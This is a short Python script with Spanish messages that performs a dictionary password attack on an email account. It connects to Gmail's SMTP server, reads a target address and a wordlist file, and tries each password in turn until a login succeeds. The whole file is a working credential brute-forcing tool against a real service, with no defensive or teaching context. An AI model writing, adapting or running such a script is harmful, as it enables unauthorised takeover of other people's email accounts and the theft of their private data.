import smtplib

smtserver = smtplib.SMTP("smtp.gmail.com", 587)
smtserver.ehlo()
smtserver.starttls()  

email = input("Email:")

dic = open("./diccionario.txt", "r")

for pwd in dic:
    pwd = pwd.strip()  
    try:
        smtserver.login(email, pwd)
        print("Contraseña correcta: %s" % pwd)
        break
    except smtplib.SMTPAuthenticationError:
        print("Contraseña incorrecta: %s" % pwd)

dic.close()
